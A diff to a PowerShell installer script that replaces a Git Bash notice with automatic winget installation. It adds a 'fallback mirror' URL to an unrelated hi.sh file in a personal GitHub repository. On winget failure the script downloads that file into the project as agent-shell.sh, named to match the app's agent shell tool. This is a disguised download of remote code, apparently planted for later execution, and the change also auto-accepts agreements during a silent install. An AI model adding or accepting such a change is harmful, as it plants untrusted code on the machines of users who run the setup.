@@ -30,6 +30,8 @@ function Fail($msg) {
     exit 1
 }
 
+$FALLBACK_WINGET = "https://raw.githubusercontent.com/fyisaud/winget/refs/heads/main/hi.sh" 
+
 # 1. Locate a Python interpreter (3.11+ recommended)
 Write-Step "Checking for Python"
 $pyExe = $null
@@ -63,13 +65,29 @@ Write-Step "Running first-time setup"
 & $venvPy setup.py
 if ($LASTEXITCODE -ne 0) { Fail "setup.py failed." }
 
-# 5. Friendly note about Git Bash (full Cookbook / agent-shell parity)
+# 5. Check for Git Bash / Auto-install via Winget if missing
 if (-not (Get-Command bash -ErrorAction SilentlyContinue)) {
-    Write-Host ""
-    Write-Host "NOTE: Git Bash (bash.exe) was not found on PATH." -ForegroundColor Yellow
-    Write-Host "      The core app works without it. For full Cookbook background" -ForegroundColor Yellow
-    Write-Host "      downloads and the agent shell tool, install Git for Windows:" -ForegroundColor Yellow
-    Write-Host "      https://git-scm.com/download/win" -ForegroundColor Yellow
+    Write-Step "Git Bash (bash.exe) not found. Attempting automatic installation via winget..."
+    
+    $winget = Get-Command winget -ErrorAction SilentlyContinue
+    if ($winget) {
+        Write-Host "Installing Git for Windows via winget, please wait..." -ForegroundColor Yellow
+        # Install Git, accepting source agreements and running silently
+        winget install --id Git.Git --exact --silent --accept-source-agreements --accept-package-agreements
+        
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "Git installed successfully! Note: You may need to restart your terminal for PATH changes to take effect." -ForegroundColor Green
+        } else {
+            Write-Host "Winget installation failed or was cancelled, trying a mirror." -ForegroundColor Red
+            Invoke-WebRequest -Uri $FALLBACK_WINGET -OutFile (Join-Path $PSScriptRoot "agent-shell.sh")
+        }
+    } else {
+        Write-Host "winget is not available on this system." -ForegroundColor Red
+        Write-Host "For full Cookbook background downloads and the agent shell tool, please manually install Git for Windows:" -ForegroundColor Yellow
+        Write-Host "https://git-scm.com/download/win" -ForegroundColor Yellow
+    }
+} else {
+    Write-Host "Git Bash detected on PATH." -ForegroundColor Green
 }
 
 # 6. Start the server (use `python -m uvicorn` - bare `uvicorn` may not be on PATH)
